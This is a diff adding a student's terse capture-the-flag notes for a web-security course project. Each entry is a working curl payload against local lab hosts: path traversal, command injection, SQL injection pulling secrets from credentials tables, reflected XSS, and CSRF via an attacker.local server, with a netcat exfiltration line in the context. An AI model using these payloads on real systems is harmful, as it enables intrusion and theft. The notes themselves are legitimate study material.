@@ -583,7 +583,7 @@ honestly idk just check class vid and script
 - do injection to get cookie `curl -c cookies.txt 'http://lab.localhost?username="hi"+or+1=1+--&password=admin'`
 - then use cookie `curl -b cookies.txt 'http://lab.localhost`
 
-### lab 5b.1 - sql pass to session ii
+### lab 5b.2 - sql pass to session ii
 
 - input escaped by double quote
 - break it then do the same
@@ -815,3 +815,76 @@ payload = input_str + padding + input_str_hash
   - take flag from secret table and put it in public table
   - get it and send it to a netcat server `nc lab.localhost -l 9999`
 - boom
+
+## Project 05 - Wrecking the Web World
+
+### .01 - transverse
+
+- like lab 5a.1
+- reads content of file at given location
+- no sanitization of input
+- `curl "http://capture.local?path=../flag"`
+
+### .02 - command override
+
+- command injection
+- `curl "http://capture.local/?timezone=UTC;cat%20flag"`
+
+### .03 - sneak in
+
+- just direct access? only one row in table, rowid as param, so just give 1
+- `curl http://capture.local/?account=1`
+
+### .04 - log me in
+
+- like lab 5b.1
+- `curl -L -c cookies.txt 'http://capture.local' -d 'account_name="OR+1=1+--&secret=test'`
+
+### .05 - is it raining?
+
+- union, like lab 5b.3
+- `curl 'http://capture.local?query="union%20select%20secret%20from%20credentials%20--`
+
+### .06 - hidden data
+
+- get from sqlite master table, like lab 5b.4
+- `curl 'http://capture.local/?query=test"union+select+name+from+sqlite_master+where+type="table"--'`
+- then use to get flag
+- `curl 'http://capture.local/?query=test"union+select+secret+from+table2456270137675749859+--'`
+
+### .07 - leak in my data
+
+- union and rowid fetch, like lab 5b.3
+- `curl -L http://capture.local/ -d 'secret=test&account_name=flag"+UNION+SELECT+secret+as+rowid+,+*+FROM+credentials+WHERE+account_name="flag"+ORDER+BY+rowid+DESC+;--'`
+
+### .08 - crossing the site
+
+- like lab 5c.1, XSS
+- `curl http://capture.local/visit?url='http://capture.local/echo?echo=<script>confirm("hi")</script>'`
+
+### .09 - dodging across the site
+
+- similar, input is escaped in a `p` tag
+- break out of it
+- `curl http://capture.local/visit?url='http://capture.local/echo?echo=</p><script>prompt("hi")</script><p>'`
+
+### .10 - acting up
+
+- endpoint to expose flag, curl it first
+- `curl http://capture.local/visit?url='http://capture.local/is-exposed'`
+- then get flag
+- `curl http://capture.local/info?account=1`
+
+### .11 - freaky forgeries
+
+- similar, but also like lab 5c.3, CSRF token
+- run a redirect server
+- expose flag `curl http://capture.local/visit?url='http://attacker.local:9999/' -H "X-CSRF-Token: $(curl http://capture.local/get-csrf-token)"`
+- get it `curl http://capture.local/info?account=1 -H "X-CSRF-Token: $(curl http://capture.local/get-csrf-token)"`
+
+### .12 - forging fence posts
+
+- like lab 5c.4, POST request so craft a form
+- run the onload-form server
+- expose flag `curl http://capture.local/visit?url='http://attacker.local:9999/' -H "X-CSRF-Token: $(curl http://capture.local/get-csrf-token)"`
+- get it `curl http://capture.local/info?account=1 -H "X-CSRF-Token: $(curl http://capture.local/get-csrf-token)"`
